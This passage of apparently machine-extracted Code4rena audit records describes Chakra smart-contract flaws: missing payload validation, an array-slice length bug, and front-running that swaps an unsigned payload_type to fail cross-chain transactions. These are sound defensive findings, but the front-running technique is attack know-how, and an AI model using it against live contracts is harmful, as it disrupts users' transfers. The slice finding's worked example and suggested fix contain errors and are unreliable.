status\"\n            );\n        }\n        ... MORE CODE\n```\nAs shown above we currently dont have a way to check if the `payload` and `payload_type` is valid.\n\n## Proof of Concept\n An attacker can craft a payload that does not conform to the expected structure of ERC20 or another valid PayloadType. For example, if the system expects an ERC20 transfer, the attacker can pass arbitrary or malformed data that the contract assumes is valid.\n\nSince there is no check to verify that the `payload_type` aligns with the contents of payload, an attacker could use this mismatch to trigger unintended actions or cause failures in downstream contracts that interact with this data.\n## Tools Used\nmanual Review\n\n## Recommended Mitigation Steps\nensure that:\n\n* The payload_type corresponds correctly to the expected format and content of the payload.\n* The payload adheres to the expected structure, data types, and content for the given payload_type.\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe `receive_cross_chain_msg` function currently accepts `payload` and `payload_type` as parameters without any validation to ensure that they are legitimate and appropriate for the context. The payload and payload_type should be verified to ensure that the message conforms to expected types This lack of validation can be exploited by attackers to pass malicious or malformed payloads, potentially leading to unauthorized actions, contract manipulation, or even denial of service. If an invalid or unexpected payload is processed, it could cause unexpected behavior in the contract or downstream contracts that interact with the payload.\n\n```javascript\n function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        {\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            require(\n                receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n                \"Invalid transaction status\"\n            );\n        }\n        ... MORE CODE\n```\nAs shown above we currently dont have a way to check if the `payload` and `payload_type` is valid.\n", "recommendation_md": "## Recommended Mitigation Steps\nensure that:\n\n* The payload_type corresponds correctly to the expected format and content of the payload.\n* The payload adheres to the expected structure, data types, and content for the given payload_type.\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\n An attacker can craft a payload that does not conform to the expected structure of ERC20 or another valid PayloadType. For example, if the system expects an ERC20 transfer, the attacker can pass arbitrary or malformed data that the contract assumes is valid.\n\nSince there is no check to verify that the `payload_type` aligns with the contents of payload, an attacker could use this mismatch to trigger unintended actions or cause failures in downstream contracts that interact with this data.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L176\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nmanual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L176\n\n\n# Vulnerability details\n\n## Impact\nThe `receive_cross_chain_msg` function currently accepts `payload` and `payload_type` as parameters without any validation to ensure that they are legitimate and appropriate for the context. The payload and payload_type should be verified to ensure that the message conforms to expected types This lack of validation can be exploited by attackers to pass malicious or malformed payloads, potentially leading to unauthorized actions, contract manipulation, or even denial of service. If an invalid or unexpected payload is processed, it could cause unexpected behavior in the contract or downstream contracts that interact with the payload.\n\n```javascript\n function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        {\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            require(\n                receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n                \"Invalid transaction status\"\n            );\n        }\n        ... MORE CODE\n```\nAs shown above we currently dont have a way to check if the `payload` and `payload_type` is valid.\n\n## Proof of Concept\n An attacker can craft a payload that does not conform to the expected structure of ERC20 or another valid PayloadType. For example, if the system expects an ERC20 transfer, the attacker can pass arbitrary or malformed data that the contract assumes is valid.\n\nSince there is no check to verify that the `payload_type` aligns with the contents of payload, an attacker could use this mismatch to trigger unintended actions or cause failures in downstream contracts that interact with this data.\n## Tools Used\nmanual Review\n\n## Recommended Mitigation Steps\nensure that:\n\n* The payload_type corresponds correctly to the expected format and content of the payload.\n* The payload adheres to the expected structure, data types, and content for the given payload_type.\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L176\n\n\n# Vulnerability details\n\n## Impact\nThe `receive_cross_chain_msg` function currently accepts `payload` and `payload_type` as parameters without any validation to ensure that they are legitimate and appropriate for the context. The payload and payload_type should be verified to ensure that the message conforms to expected types This lack of validation can be exploited by attackers to pass malicious or malformed payloads, potentially leading to unauthorized actions, contract manipulation, or even denial of service. If an invalid or unexpected payload is processed, it could cause unexpected behavior in the contract or downstream contracts that interact with the payload. \n\n```javascript\n function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        {\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            require(\n                receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n                \"Invalid transaction status\"\n            );\n        }\n        ... MORE CODE\n```\nAs shown above we currently dont have a way to check if the `payload` and `payload_type` is valid.\n\n## Proof of Concept\n An attacker can craft a payload that does not conform to the expected structure of ERC20 or another valid PayloadType. For example, if the system expects an ERC20 transfer, the attacker can pass arbitrary or malformed data that the contract assumes is valid.\n\nSince there is no check to verify that the `payload_type` aligns with the contents of payload, an attacker could use this mismatch to trigger unintended actions or cause failures in downstream contracts that interact with this data.\n## Tools Used\nmanual Review\n\n## Recommended Mitigation Steps\nensure that:\n\n* The payload_type corresponds correctly to the expected format and content of the payload.\n* The payload adheres to the expected structure, data types, and content for the given payload_type.\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-466", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 466, "page_start": null, "title": "Incorrect length calculation in u128_array_slice function", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L443\n\n\n# Vulnerability details\n\n## Impact\n- Incorrect slice length\nThe slice may contain too many or too few elements.\n\n- Potential out-of-bounds access\nIf begin + end exceeds the source array's length, it may cause runtime errors or undefined behavior.\n\n- Unexpected results\nUsers of this function will likely get slices that don't match their intentions.\n\n## Proof of Concept\nThe u128_array_slice function in the codebase contains a critical bug in its length calculation. The function is designed to create a slice of a u128 array, but it incorrectly calculates the length of the slice.\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L443\n\nThe bug lies in here:\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;  // This line contains the bug\n    // ... rest of the function\n}\n```\nAssuming end is meant to be the number of elements:\n\n```\nlet source = array![1_u128, 2_u128, 3_u128, 4_u128, 5_u128];\nlet result = u128_array_slice(@source, 1, 3);\n// Expected: [2, 3, 4]\n// Actual: [2, 3, 4, 5] (or runtime error if out of bounds)\n```\n\nIn this case, the function would try to create a slice from index 1 to index 4 (1 + 3), instead of taking 3 elements starting from index 1.\n\nAssuming end is meant to be the end index:\n\n```\nlet source = array![1_u128, 2_u128, 3_u128, 4_u128, 5_u128];\nlet result = u128_array_slice(@source, 1, 4);\n// Expected: [2, 3, 4]\n// Actual: [2, 3, 4, 5] (or runtime error if out of bounds)\n```\n\nHere, the function would try to create a slice from index 1 to index 5 (1 + 4), instead of from index 1 to index 4.\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nThe function should be revised to clearly define the meaning of the end parameter. Two possible corrections are:\n\nIf end should represent the number of elements:\n\n```\nlet len = begin + end;\nif len > src.len() {\n    len = src.len();\n}\n```\n\n\nIf end should represent the end index:\n```\nlet len = end;\nif len > src.len() {\n    len = src.len();\n}\n```\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\n- Incorrect slice length\nThe slice may contain too many or too few elements.\n\n- Potential out-of-bounds access\nIf begin + end exceeds the source array's length, it may cause runtime errors or undefined behavior.\n\n- Unexpected results\nUsers of this function will likely get slices that don't match their intentions.\n", "recommendation_md": "## Recommended Mitigation Steps\nThe function should be revised to clearly define the meaning of the end parameter. Two possible corrections are:\n\nIf end should represent the number of elements:\n\n```\nlet len = begin + end;\nif len > src.len() {\n    len = src.len();\n}\n```\n\n\nIf end should represent the end index:\n```\nlet len = end;\nif len > src.len() {\n    len = src.len();\n}\n```\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\nThe u128_array_slice function in the codebase contains a critical bug in its length calculation. The function is designed to create a slice of a u128 array, but it incorrectly calculates the length of the slice.\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L443\n\nThe bug lies in here:\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;  // This line contains the bug\n    // ... rest of the function\n}\n```\nAssuming end is meant to be the number of elements:\n\n```\nlet source = array![1_u128, 2_u128, 3_u128, 4_u128, 5_u128];\nlet result = u128_array_slice(@source, 1, 3);\n// Expected: [2, 3, 4]\n// Actual: [2, 3, 4, 5] (or runtime error if out of bounds)\n```\n\nIn this case, the function would try to create a slice from index 1 to index 4 (1 + 3), instead of taking 3 elements starting from index 1.\n\nAssuming end is meant to be the end index:\n\n```\nlet source = array![1_u128, 2_u128, 3_u128, 4_u128, 5_u128];\nlet result = u128_array_slice(@source, 1, 4);\n// Expected: [2, 3, 4]\n// Actual: [2, 3, 4, 5] (or runtime error if out of bounds)\n```\n\nHere, the function would try to create a slice from index 1 to index 5 (1 + 4), instead of from index 1 to index 4.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L443\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L443\n\n\n# Vulnerability details\n\n## Impact\n- Incorrect slice length\nThe slice may contain too many or too few elements.\n\n- Potential out-of-bounds access\nIf begin + end exceeds the source array's length, it may cause runtime errors or undefined behavior.\n\n- Unexpected results\nUsers of this function will likely get slices that don't match their intentions.\n\n## Proof of Concept\nThe u128_array_slice function in the codebase contains a critical bug in its length calculation. The function is designed to create a slice of a u128 array, but it incorrectly calculates the length of the slice.\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L443\n\nThe bug lies in here:\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;  // This line contains the bug\n    // ... rest of the function\n}\n```\nAssuming end is meant to be the number of elements:\n\n```\nlet source = array![1_u128, 2_u128, 3_u128, 4_u128, 5_u128];\nlet result = u128_array_slice(@source, 1, 3);\n// Expected: [2, 3, 4]\n// Actual: [2, 3, 4, 5] (or runtime error if out of bounds)\n```\n\nIn this case, the function would try to create a slice from index 1 to index 4 (1 + 3), instead of taking 3 elements starting from index 1.\n\nAssuming end is meant to be the end index:\n\n```\nlet source = array![1_u128, 2_u128, 3_u128, 4_u128, 5_u128];\nlet result = u128_array_slice(@source, 1, 4);\n// Expected: [2, 3, 4]\n// Actual: [2, 3, 4, 5] (or runtime error if out of bounds)\n```\n\nHere, the function would try to create a slice from index 1 to index 5 (1 + 4), instead of from index 1 to index 4.\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nThe function should be revised to clearly define the meaning of the end parameter. Two possible corrections are:\n\nIf end should represent the number of elements:\n\n```\nlet len = begin + end;\nif len > src.len() {\n    len = src.len();\n}\n```\n\n\nIf end should represent the end index:\n```\nlet len = end;\nif len > src.len() {\n    len = src.len();\n}\n```\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L443\n\n\n# Vulnerability details\n\n## Impact\n- Incorrect slice length \nThe slice may contain too many or too few elements.\n\n- Potential out-of-bounds access\nIf begin + end exceeds the source array's length, it may cause runtime errors or undefined behavior.\n\n- Unexpected results\nUsers of this function will likely get slices that don't match their intentions.\n\n## Proof of Concept\nThe u128_array_slice function in the codebase contains a critical bug in its length calculation. The function is designed to create a slice of a u128 array, but it incorrectly calculates the length of the slice.\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L443\n\nThe bug lies in here:\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;  // This line contains the bug\n    // ... rest of the function\n}\n```\nAssuming end is meant to be the number of elements:\n\n```\nlet source = array![1_u128, 2_u128, 3_u128, 4_u128, 5_u128];\nlet result = u128_array_slice(@source, 1, 3);\n// Expected: [2, 3, 4]\n// Actual: [2, 3, 4, 5] (or runtime error if out of bounds)\n```\n\nIn this case, the function would try to create a slice from index 1 to index 4 (1 + 3), instead of taking 3 elements starting from index 1.\n\nAssuming end is meant to be the end index:\n\n```\nlet source = array![1_u128, 2_u128, 3_u128, 4_u128, 5_u128];\nlet result = u128_array_slice(@source, 1, 4);\n// Expected: [2, 3, 4]\n// Actual: [2, 3, 4, 5] (or runtime error if out of bounds)\n```\n\nHere, the function would try to create a slice from index 1 to index 5 (1 + 4), instead of from index 1 to index 4.\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nThe function should be revised to clearly define the meaning of the end parameter. Two possible corrections are:\n\nIf end should represent the number of elements:\n\n```\nlet len = begin + end;\nif len > src.len() {\n    len = src.len();\n}\n```\n\n\nIf end should represent the end index:\n```\nlet len = end;\nif len > src.len() {\n    len = src.len();\n}\n```\n\n\n## Assessed type\n\nContext"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-481", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 481, "page_start": null, "title": "Anybody can change the payload type on the destination chain and set tx to FAILED", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L176\n\n\n# Vulnerability details\n\n## Impact\n\nIn `ChakraSettlement` smart contract, the function `receive_cross_chain_msg()` is called after the message is picked by the validators and signed by them. The function verifies the signatures and the message hash. The problem is that when this tx is sent it can be seen by other people and a malicious user can just front-run the tx and put the same parameters except for payload type. And since `message_hash` is generated without taking into account `payload_type`, the tx will be blocked and its execution set to FAILED as none of the functions will be called in the handler contract.\n\n## Proof of Concept\n\n\nTake a look at the current implementation of `receive_cross_chain_msg()`:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L170-180\n```\nfunction receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n```\n\n\nSo it transfers signatures and all the data associated with the message. Now let's look at the way message hash is created:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L183-192\n```\n  bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n```\n\n`message_hash` includes all the function parameters except for signatures (that are later verified) and `payload_type`. So a malicious user can just put `ERC721` as a `payload_type` instead of `ERC20` and the transaction will revert:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L316\n```\n require(isValidPayloadType(payload_type), \"Invalid payload type\");\n```\n\nSo the tx will be set to FAILED (at the moment it just reverts due to another vulnerability but in the future the result will be boolean)\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nInclude `payload_type` in the `message_hash` or introduce `onlyValidator` modifier.\n\n\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nIn `ChakraSettlement` smart contract, the function `receive_cross_chain_msg()` is called after the message is picked by the validators and signed by them. The function verifies the signatures and the message hash. The problem is that when this tx is sent it can be seen by other people and a malicious user can just front-run the tx and put the same parameters except for payload type. And since `message_hash` is generated without taking into account `payload_type`, the tx will be blocked and its execution set to FAILED as none of the functions will be called in the handler contract.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nInclude `payload_type` in the `message_hash` or introduce `onlyValidator` modifier.\n\n\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\n\n\nTake a look at the current implementation of `receive_cross_chain_msg()`:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L170-180\n```\nfunction receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n```\n\n\nSo it transfers signatures and all the data associated with the message. Now let's look at the way message hash is created:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L183-192\n```\n  bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n```\n\n`message_hash` includes all the function parameters except for signatures (that are later verified) and `payload_type`. So a malicious user can just put `ERC721` as a `payload_type` instead of `ERC20` and the transaction will revert:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L316\n```\n require(isValidPayloadType(payload_type), \"Invalid payload type\");\n```\n\nSo the tx will be set to FAILED (at the moment it just reverts due to another vulnerability but in the future the result will be boolean)\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L176\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review.\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L176\n\n\n# Vulnerability details\n\n## Impact\n\nIn `ChakraSettlement` smart contract, the function `receive_cross_chain_msg()` is called after the message is picked by the validators and signed by them. The function verifies the signatures and the message hash. The problem is that when this tx is sent it can be seen by other people and a malicious user can just front-run the tx and put the same parameters except for payload type. And since `message_hash` is generated without taking into account `payload_type`, the tx will be blocked and its execution set to FAILED as none of the functions will be called in the handler contract.\n\n## Proof of Concept\n\n\nTake a look at the current implementation of `receive_cross_chain_msg()`:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L170-180\n```\nfunction receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n```\n\n\nSo it transfers signatures and all the data associated with the message. Now let's look at the way message hash is created:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L183-192\n```\n  bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n```\n\n`message_hash` includes all the function parameters except for signatures (that are later verified) and `payload_type`. So a malicious user can just put `ERC721` as a `payload_type` instead of `ERC20` and the transaction will revert:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L316\n```\n require(isValidPayloadType(payload_type), \"Invalid payload type\");\n```\n\nSo the tx will be set to FAILED (at the moment it just reverts due to another vulnerability but in the future the result will be boolean)\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nInclude `payload_type` in the `message_hash` or introduce `onlyValidator` modifier.\n\n\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L176\n\n\n# Vulnerability details\n\n## Impact\n\nIn `ChakraSettlement` smart contract, the function `receive_cross_chain_msg()` is called after the message is picked by the validators and signed by them. The function verifies the signatures and the message hash. The problem is that when this tx is sent it can be seen by other people and a malicious user can just front-run the tx and put the same parameters except for payload type. And since `message_hash` is generated without taking into account `payload_type`, the tx will be blocked and its execution set to FAILED as none of the functions will be called in the handler contract.\n\n## Proof of Concept\n\n\nTake a look at the current implementation of `receive_cross_chain_msg()`:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L170-180\n```\nfunction receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n```\n\n\nSo it transfers signatures and all the data associated with the message. Now let's look at the way message hash is created:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L183-192\n```\n  bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n```\n\n`message_hash` includes all the function parameters except for signatures (that are later verified) and `payload_type`. So a malicious user can just put `ERC721` as a `payload_type` instead of `ERC20` and the transaction will revert:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L316\n```\n require(isValidPayloadType(payload_type), \"Invalid payload type\");\n```\n\nSo the tx will be set to FAILED (at the moment it just reverts due to another vulnerability but in the future the result will be boolean)\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nInclude `payload_type` in the `message_hash` or introduce `onlyValidator` modifier.\n\n\n\n\n## Assessed type\n\nOther"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-482", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 482, "page_start": null, "title": "Missing `ERC20Method` validation at destination allows non-transfer tx to be handled as transfers.", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L318-L330\n\n\n# Vulnerability details\n\n## Impact\nIn cross-chain transactions, the integrity and correctness of the transaction must be maintained across different blockchain environments, which might have varying security measures, protocols. However, the missing `ERC20method` validation at destination allows cross-chain tx with a different `ERC20Method` from `Transfer` to be handled as transfer transactions when they actually aren't.\n\n## Proof of Concept\nWhen sending a cross-chain tx, the `sender` locks/burns some amount of tokens at `source` chain. With this, the `recipient` then unlocks or gets minted same amount of tokens at the `destination`.\nBasically this is similar to `Token Transfer` from one address to another.\n\nAs such, 